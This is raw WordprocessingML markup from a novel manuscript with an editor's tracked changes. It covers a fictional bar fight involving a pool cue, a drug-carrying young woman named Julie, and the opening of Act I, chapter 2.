        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He g</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rabb</w:t>
      </w:r>
      <w:ins w:id="110" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="111" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">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the thicker end</w:t>
      </w:r>
      <w:ins w:id="112" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidR="004E252B">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ins w:id="113" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="114" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rammed the butt against his attacker’s temple. The kneeling man reeled </w:t>
      </w:r>
      <w:ins w:id="115" w:author="TextVet" w:date="2016-03-14T17:59:00Z">
        <w:r w:rsidR="000A3937">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>then</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="116" w:author="TextVet" w:date="2016-03-14T17:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000A3937">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> collapsed</w:t>
      </w:r>
      <w:ins w:id="117" w:author="TextVet" w:date="2016-03-14T17:59:00Z">
        <w:r w:rsidR="00727864">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> like a sack of wet laundry</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bodyguard at Julie’s side approached the melee, reaching out to grapple Eugene with elephant-trunk arms. Eugene </w:t>
      </w:r>
      <w:ins w:id="118" w:author="TextVet" w:date="2016-03-14T11:42:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>lightning-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="119" w:author="TextVet" w:date="2016-03-14T11:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">quickly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scanned the large man’s posture for weaknesses.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pair of hairy, thick-fingered hands appeared beneath the bodyguard’s armpits. They snaked up over his shoulders and joined behind the man’s head, locking his arms in a full nelson. </w:t>
      </w:r>
      <w:ins w:id="120" w:author="TextVet" w:date="2016-03-14T18:00:00Z">
        <w:r w:rsidR="00536548">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Astonished, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="121" w:author="TextVet" w:date="2016-03-14T18:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536548">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="122" w:author="TextVet" w:date="2016-03-14T18:00:00Z">
        <w:r w:rsidR="00536548">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he guard</w:t>
      </w:r>
      <w:del w:id="123" w:author="TextVet" w:date="2016-03-14T18:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536548">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, taken by surprise,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> struggled to break free from the unseen figure behind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wasted no time. He stabbed the cracked end of the pool cue into a patch of vulnerable flesh below the guard’s ribs. The splintered wood tore through cloth, skin, and muscle</w:t>
      </w:r>
      <w:del w:id="124" w:author="TextVet" w:date="2016-03-14T18:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A42A8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="125" w:author="TextVet" w:date="2016-03-14T11:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="126" w:author="TextVet" w:date="2016-03-14T18:04:00Z">
        <w:r w:rsidR="001B3B93">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t xml:space="preserve">; </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="127" w:author="TextVet" w:date="2016-03-14T18:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007E765F">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when Eugene released the stick</w:t>
      </w:r>
      <w:ins w:id="128" w:author="TextVet" w:date="2016-03-14T11:43:00Z">
        <w:r w:rsidR="004E252B">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it remained lodged in his torso. The bodyguard emitted a powerless grunt and sank to the floor, his blood r</w:t>
      </w:r>
      <w:del w:id="129" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>unn</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="130" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>vuleti</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ng down the </w:t>
      </w:r>
      <w:del w:id="131" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">pool </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">cue. </w:t>
      </w:r>
      <w:ins w:id="132" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidR="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>S</w:t>
        </w:r>
        <w:r w:rsidR="00C77688" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>avvy</w:t>
        </w:r>
        <w:r w:rsidR="00F9243B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> enough to see and hear nothing</w:t>
        </w:r>
        <w:r w:rsidR="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="133" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="134" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidR="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he bartender and patrons looked away furtively as the wounded man crawled toward an exit</w:t>
      </w:r>
      <w:del w:id="135" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>;</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="136" w:author="TextVet" w:date="2016-03-14T11:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="137" w:author="TextVet" w:date="2016-03-14T11:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>they were savvy enough to see and hear nothing</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With the bodyguard </w:t>
      </w:r>
      <w:ins w:id="138" w:author="TextVet" w:date="2016-03-14T18:02:00Z">
        <w:r w:rsidR="00D04690">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>down</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="139" w:author="TextVet" w:date="2016-03-14T18:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D04690">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fallen</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Eugene saw the round, rugged face and the massive, middle-aged form of the man who had come to his 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Eugene said in his native tongue. “What did you do that for? I could’ve handled him on my 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smirked warmly at him. “Where’s this princess that’s causing so much fuss?”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The </w:t>
      </w:r>
      <w:ins w:id="140" w:author="TextVet" w:date="2016-03-14T18:03:00Z">
        <w:r w:rsidR="002E7174">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pair</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="141" w:author="TextVet" w:date="2016-03-14T18:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002E7174">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>two of them</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> spotted Julie cowering by the back wall, crouching in her couture footwear. She held her barstool in both hands, jabbing it at them like a lion-tamer. </w:t>
      </w:r>
      <w:del w:id="142" w:author="TextVet" w:date="2016-03-14T18:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005268BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was no place for her</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="143" w:author="TextVet" w:date="2016-03-14T18:03:00Z">
        <w:r w:rsidR="005268BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>She had nowhere</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to run.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regarded her</w:t>
      </w:r>
      <w:ins w:id="144" w:author="TextVet" w:date="2016-03-14T11:45:00Z">
        <w:r w:rsidR="00C7768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del w:id="145" w:author="TextVet" w:date="2016-03-14T11:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>frown</w:t>
      </w:r>
      <w:ins w:id="146" w:author="TextVet" w:date="2016-03-14T11:45:00Z">
        <w:r w:rsidR="00C77688">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“She’s very young.”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“And high as the moon,” Eugene added. “Apparently she manufactures it herself. Somehow.” Her Hello Kitty purse lay near his feet — the girl had tossed it during the scuffle. Eugene squatted down and walked his fingers into </w:t>
      </w:r>
      <w:ins w:id="147" w:author="TextVet" w:date="2016-03-14T11:46:00Z">
        <w:r w:rsidR="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>it</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="148" w:author="TextVet" w:date="2016-03-14T11:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77688">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the purse’</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s open top to peek inside. Amidst mascara and lipstick and a sandwich bag full of powdered cocaine, </w:t>
      </w:r>
      <w:del w:id="149" w:author="TextVet" w:date="2016-03-14T18:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002D53FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">there was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a plain white keycard</w:t>
      </w:r>
      <w:ins w:id="150" w:author="TextVet" w:date="2016-03-14T18:05:00Z">
        <w:r w:rsidR="002D53FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> announced </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="151" w:author="TextVet" w:date="2016-03-14T18:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002D53FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. It bore </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a stylized letter </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and the inscription, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tungsten Medical Technologies</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nodded. “I’ve heard these rumors. Think they have any truth?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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stood back up and looked at the cowering young woman. “She says we wouldn’t understand the truth,” he said as he and Sergey closed in on her. “But she’ll have plenty of time to explain it to us.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C824A8" w:rsidRDefault="00C824A8" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C824A8" w:rsidRPr="000D3488" w:rsidRDefault="00C824A8" w:rsidP="00321965">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00B45500">
      <w:pPr>
        <w:pStyle w:val="ActBreak"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Act I</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>2</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applause reminded Danny</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of this one time in an alternate universe. His band played before an adoring throng of pink-haired girls and slim-hipped guys. His electric guitar screamed in ecstasy beneath his motion-blurred fingers, gushing chords like liquid lightning into the air of the arena. The song finished, and he spread his arms to embrace the spotlight as the crowd below worshipped him with cries of adulation.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Unfortunately, that never actually happened.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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It should be louder than this</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, thought Danny. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
